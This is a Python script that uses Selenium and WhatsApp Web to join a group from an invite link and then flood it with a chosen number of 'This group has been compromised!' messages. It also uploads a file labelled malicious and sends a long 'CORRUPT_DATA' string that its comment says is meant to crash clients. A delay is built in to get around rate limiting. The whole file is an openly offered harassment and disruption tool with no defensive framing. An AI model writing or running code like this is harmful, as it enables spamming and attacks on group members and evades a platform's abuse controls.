import requests
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# Configuration
group_link = input("Enter the WhatsApp group invite link: ")
message ="This group has been compromised! ðŸ˜ˆ"  # Customize message
flood_count = int(input("Enter number of messages to flood: "))
media_path ="/path/to/malicious/file.jpg"  # Optional: Path to media file

# Set up Selenium WebDriver for WhatsApp Web
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
driver.get("https://web.whatsapp.com")
input("Scan the QR code and press Enter to continue...")

# Join the group via invite link
driver.get(group_link)
time.sleep(5)  # Wait for page to load
join_button = driver.find_element(By.XPATH,"//div[@title='Join group']")
join_button.click()
time.sleep(5)  # Wait for group to load

# Locate the message input field
message_box = driver.find_element(By.XPATH,"//div[@title='Type a message']")

# Flood the group with messages
for i in range(flood_count):
    message_box.send_keys(message)
    driver.find_element(By.XPATH,"//button[@aria-label='Send']").click()
    time.sleep(0.5)  # Avoid rate limiting

# Optional: Upload malicious media
if media_path:
    attach_button = driver.find_element(By.XPATH,"//div[@title='Attach']")
    attach_button.click()
    file_input = driver.find_element(By.XPATH,"//input[@accept='*']")
    file_input.send_keys(media_path)
    driver.find_element(By.XPATH,"//button[@aria-label='Send']").click()

# Optional: Send malicious payload (e.g., corrupt data)
payload ="CORRUPT_DATA" * 1000  # Large string to crash clients
message_box.send_keys(payload)
driver.find_element(By.XPATH,"//button[@aria-label='Send']").click()

print(f"Group flooded with {flood_count} messages and payload delivered.")
driver.quit()